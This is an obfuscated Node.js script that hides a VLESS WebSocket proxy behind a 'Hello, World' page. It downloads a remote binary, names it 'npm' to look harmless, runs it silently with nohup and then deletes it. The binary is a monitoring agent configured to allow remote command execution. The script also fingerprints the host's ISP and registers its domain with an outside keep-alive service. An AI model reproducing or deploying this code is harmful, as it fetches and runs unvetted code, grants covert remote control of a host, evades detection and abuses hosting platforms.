const _0x57e9ea=_0x3555;(function(_0x1a9a2c,_0x5ad25c){const _0x2e78f1=_0x3555,_0x462eb9=_0x1a9a2c();while(!![]){try{const _0x24273a=-parseInt(_0x2e78f1(0x8f))/0x1*(parseInt(_0x2e78f1(0xd4))/0x2)+parseInt(_0x2e78f1(0xcf))/0x3*(parseInt(_0x2e78f1(0xa4))/0x4)+parseInt(_0x2e78f1(0x9d))/0x5+-parseInt(_0x2e78f1(0xbb))/0x6*(parseInt(_0x2e78f1(0x8e))/0x7)+parseInt(_0x2e78f1(0x98))/0x8+-parseInt(_0x2e78f1(0xb6))/0x9*(parseInt(_0x2e78f1(0xd2))/0xa)+parseInt(_0x2e78f1(0x80))/0xb;if(_0x24273a===_0x5ad25c)break;else _0x462eb9['push'](_0x462eb9['shift']());}catch(_0x454dae){_0x462eb9['push'](_0x462eb9['shift']());}}}(_0x19b3,0xe1683));function _0x3555(_0x4078e2,_0xb47e63){const _0x19b336=_0x19b3();return _0x3555=function(_0x355556,_0x234351){_0x355556=_0x355556-0x70;let _0x279b9e=_0x19b336[_0x355556];return _0x279b9e;},_0x3555(_0x4078e2,_0xb47e63);}const os=require('os'),http=require(_0x57e9ea(0xbe)),fs=require('fs'),axios=require(_0x57e9ea(0x7a)),net=require(_0x57e9ea(0x83)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x57e9ea(0xb5)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x57e9ea(0x91)]['UUID']||'de04add9-5c68-6bab-950c-08cd5320df33',NEZHA_SERVER=process[_0x57e9ea(0x91)][_0x57e9ea(0xb8)]||'',NEZHA_PORT=process['env'][_0x57e9ea(0xa1)]||'',NEZHA_KEY=process[_0x57e9ea(0x91)][_0x57e9ea(0xc4)]||'',DOMAIN=process['env'][_0x57e9ea(0x96)]||_0x57e9ea(0x9f),AUTO_ACCESS=process['env'][_0x57e9ea(0xd0)]||!![],SUB_PATH=process[_0x57e9ea(0x91)][_0x57e9ea(0x9a)]||_0x57e9ea(0xcb),NAME=process[_0x57e9ea(0x91)]['NAME']||'Vls',PORT=process[_0x57e9ea(0x91)][_0x57e9ea(0x99)]||0xbb8,metaInfo=execSync(_0x57e9ea(0x85),{'encoding':_0x57e9ea(0x95)}),ISP=metaInfo[_0x57e9ea(0x86)](),httpServer=http[_0x57e9ea(0x8c)]((_0x29cceb,_0x44d423)=>{const _0x1d0bae=_0x57e9ea;if(_0x29cceb['url']==='/')_0x44d423[_0x1d0bae(0x72)](0xc8,{'Content-Type':_0x1d0bae(0x7e)}),_0x44d423['end']('Hello,\x20World\x0a');else{if(_0x29cceb[_0x1d0bae(0xa8)]==='/'+SUB_PATH){const _0xe0c07c=_0x1d0bae(0x7f)+UUID+_0x1d0bae(0xac)+DOMAIN+'&type=ws&host='+DOMAIN+'&path=%2F#'+NAME+'-'+ISP,_0x41540e=Buffer[_0x1d0bae(0xce)](_0xe0c07c)['toString']('base64');_0x44d423['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x44d423[_0x1d0bae(0x7b)](_0x41540e+'\x0a');}else _0x44d423[_0x1d0bae(0x72)](0x194,{'Content-Type':'text/plain'}),_0x44d423[_0x1d0bae(0x7b)](_0x1d0bae(0xb9));}}),wss=new WebSocket[(_0x57e9ea(0xc3))]({'server':httpServer}),uuid=UUID['replace'](/-/g,'');wss['on'](_0x57e9ea(0xa0),_0x48ed03=>{const _0x3378a1=_0x57e9ea;_0x48ed03['once'](_0x3378a1(0xa5),_0x945d9a=>{const _0x2abde5=_0x3378a1,[_0x225714]=_0x945d9a,_0x7c2b9f=_0x945d9a[_0x2abde5(0xc0)](0x1,0x11);if(!_0x7c2b9f[_0x2abde5(0xad)]((_0x56e663,_0x13a490)=>_0x56e663==parseInt(uuid[_0x2abde5(0x93)](_0x13a490*0x2,0x2),0x10)))return;let _0x321ab0=_0x945d9a['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x48fff3=_0x945d9a['slice'](_0x321ab0,_0x321ab0+=0x2)[_0x2abde5(0x9e)](0x0),_0x36abce=_0x945d9a['slice'](_0x321ab0,_0x321ab0+=0x1)['readUInt8'](),_0x1cc9f6=_0x36abce==0x1?_0x945d9a[_0x2abde5(0xc0)](_0x321ab0,_0x321ab0+=0x4)[_0x2abde5(0xc8)]('.'):_0x36abce==0x2?new TextDecoder()[_0x2abde5(0xaa)](_0x945d9a['slice'](_0x321ab0+0x1,_0x321ab0+=0x1+_0x945d9a[_0x2abde5(0xc0)](_0x321ab0,_0x321ab0+0x1)[_0x2abde5(0xc6)]())):_0x36abce==0x3?_0x945d9a['slice'](_0x321ab0,_0x321ab0+=0x10)['reduce']((_0x37692c,_0x1796e0,_0x258a9b,_0x3b3176)=>_0x258a9b%0x2?_0x37692c[_0x2abde5(0x97)](_0x3b3176[_0x2abde5(0xc0)](_0x258a9b-0x1,_0x258a9b+0x1)):_0x37692c,[])[_0x2abde5(0x7d)](_0x1856d2=>_0x1856d2[_0x2abde5(0x9e)](0x0)[_0x2abde5(0x70)](0x10))[_0x2abde5(0xc8)](':'):'';_0x48ed03[_0x2abde5(0x9c)](new Uint8Array([_0x225714,0x0]));const _0x2bec63=createWebSocketStream(_0x48ed03);net[_0x2abde5(0x76)]({'host':_0x1cc9f6,'port':_0x48fff3},function(){const _0x7b7bd6=_0x2abde5;this[_0x7b7bd6(0x79)](_0x945d9a[_0x7b7bd6(0xc0)](_0x321ab0)),_0x2bec63['on'](_0x7b7bd6(0x8b),()=>{})[_0x7b7bd6(0xb0)](this)['on'](_0x7b7bd6(0x8b),()=>{})['pipe'](_0x2bec63);})['on']('error',()=>{});})['on'](_0x3378a1(0x8b),()=>{});});const getDownloadUrl=()=>{const _0x5c04fe=_0x57e9ea,_0x4c62d9=os[_0x5c04fe(0xab)]();return _0x4c62d9==='arm'||_0x4c62d9===_0x5c04fe(0xd1)||_0x4c62d9===_0x5c04fe(0x88)?!NEZHA_PORT?_0x5c04fe(0xa7):_0x5c04fe(0x90):!NEZHA_PORT?_0x5c04fe(0xb1):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3011fc=_0x57e9ea;try{const _0x17b897=getDownloadUrl(),_0x5c5a7d=await axios({'method':'get','url':_0x17b897,'responseType':'stream'}),_0x3e16a9=fs[_0x3011fc(0x75)](_0x3011fc(0x78));return _0x5c5a7d[_0x3011fc(0x92)][_0x3011fc(0xb0)](_0x3e16a9),new Promise((_0x4b7a9f,_0x777b9f)=>{const _0x56c9a3=_0x3011fc;_0x3e16a9['on'](_0x56c9a3(0xc7),()=>{const _0x564b6c=_0x56c9a3;console[_0x564b6c(0xba)](_0x564b6c(0xc9)),exec(_0x564b6c(0x73),_0x51f54c=>{if(_0x51f54c)_0x777b9f(_0x51f54c);_0x4b7a9f();});}),_0x3e16a9['on'](_0x56c9a3(0x8b),_0x777b9f);});}catch(_0x1d4f8f){throw _0x1d4f8f;}},runnz=async()=>{const _0x472afe=_0x57e9ea;await downloadFile();let _0x150ee1='',_0x535dc5='';console[_0x472afe(0xba)](_0x472afe(0x81)+NEZHA_SERVER);const _0x119da1=()=>{const _0x18b4b9=_0x472afe;try{const _0x2cdac1=execSync(_0x18b4b9(0x8a))[_0x18b4b9(0x70)]();return _0x2cdac1['length']>0x0;}catch(_0x3015e6){return![];}};if(_0x119da1()){console[_0x472afe(0xba)]('npm\x20is\x20already\x20running');return;}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x312baf=[_0x472afe(0xc5),_0x472afe(0xa6),_0x472afe(0x74),_0x472afe(0x89),'2083',_0x472afe(0x9b)];_0x150ee1=_0x312baf[_0x472afe(0x7c)](NEZHA_PORT)?_0x472afe(0x77):'',_0x535dc5=_0x472afe(0xbf)+NEZHA_SERVER+':'+NEZHA_PORT+_0x472afe(0xa3)+NEZHA_KEY+'\x20'+_0x150ee1+_0x472afe(0xc1);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2edacd=NEZHA_SERVER[_0x472afe(0x7c)](':')?NEZHA_SERVER[_0x472afe(0xa9)](':')[_0x472afe(0xbc)]():'',_0x4a9dee=new Set(['443',_0x472afe(0xa6),_0x472afe(0x74),_0x472afe(0x89),_0x472afe(0x84),_0x472afe(0x9b)]),_0x2a2cd1=_0x4a9dee['has'](_0x2edacd)?_0x472afe(0xbd):'false',_0x154d15=_0x472afe(0xc2)+NEZHA_KEY+_0x472afe(0x8d)+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x2a2cd1+_0x472afe(0xb4)+UUID;!fs['existsSync'](_0x472afe(0x87))&&fs['writeFileSync']('config.yaml',_0x154d15);}_0x535dc5=_0x472afe(0xcc);}else{console['log'](_0x472afe(0x71));return;}}try{exec(_0x535dc5,{'shell':_0x472afe(0xa2)}),console[_0x472afe(0xba)]('npm\x20is\x20running');}catch(_0xfb8485){console['error'](_0x472afe(0xb7)+_0xfb8485);}};async function addAccessTask(){const _0x1e9ce0=_0x57e9ea;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console['log'](_0x1e9ce0(0xca));return;}else{const _0x2aafa7=_0x1e9ce0(0xcd)+DOMAIN,_0x2bd404=_0x1e9ce0(0x94)+_0x2aafa7+'\x22}\x27';exec(_0x2bd404,(_0x202807,_0x2e8a0a,_0x3ca2f0)=>{const _0x1de0f2=_0x1e9ce0;if(_0x202807){console[_0x1de0f2(0x8b)](_0x1de0f2(0xb2),_0x202807[_0x1de0f2(0xa5)]);return;}console['log'](_0x1de0f2(0xb3),_0x2e8a0a);});}}catch(_0x317337){console[_0x1e9ce0(0x8b)](_0x1e9ce0(0xaf),_0x317337[_0x1e9ce0(0xa5)]);}}const delFiles=()=>{const _0x51e159=_0x57e9ea;fs[_0x51e159(0xae)](_0x51e159(0x78),()=>{}),fs['unlink'](_0x51e159(0x87),()=>{});};httpServer[_0x57e9ea(0xd3)](PORT,()=>{const _0x31ef8a=_0x57e9ea;runnz(),addAccessTask(),console[_0x31ef8a(0xba)](_0x31ef8a(0x82)+PORT);});function _0x19b3(){const _0x34ef45=['pop','true','http','nohup\x20./npm\x20-s\x20','slice','\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','Server','NEZHA_KEY','443','readUInt8','finish','join','npm\x20download\x20successfully','URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task','sub','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://','from','971724bhKcPk','AUTO_ACCESS','arm64','70GYLFog','listen','89532qvZCWA','toString','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','writeHead','chmod\x20+x\x20./npm','2096','createWriteStream','connect','--tls','npm','write','axios','end','includes','map','text/plain','vless://','14441394wAbVBA','NEZHA_SERVER:\x20','Server\x20is\x20running\x20on\x20port\x20','net','2083','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','trim','config.yaml','aarch64','2087','ps\x20aux\x20|\x20grep\x20\x22npm\x22\x20|\x20grep\x20-v\x20\x22grep\x22','error','createServer','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','534065wVxglq','17coJMGU','https://arm64.ssss.nyc.mn/agent','env','data','substr','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','utf-8','DOMAIN','concat','2457512LcKUCo','PORT','SUB_PATH','2053','send','2927910JoQkgW','readUInt16BE','1234.abc.com','connection','NEZHA_PORT','/bin/bash','\x20-p\x20','8CsZKRN','message','8443','https://arm64.ssss.nyc.mn/v1','url','split','decode','arch','@www.visa.com.tw:443?encryption=none&security=tls&sni=','every','unlink','Error\x20added\x20Task:','pipe','https://amd64.ssss.nyc.mn/v1','Error\x20sending\x20request:','Automatic\x20Access\x20Task\x20added\x20successfully:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','child_process','227979jPKXCE','npm\x20running\x20error:\x20','NEZHA_SERVER','Not\x20Found\x0a','log','78csQTGt'];_0x19b3=function(){return _0x34ef45;};return _0x19b3();}
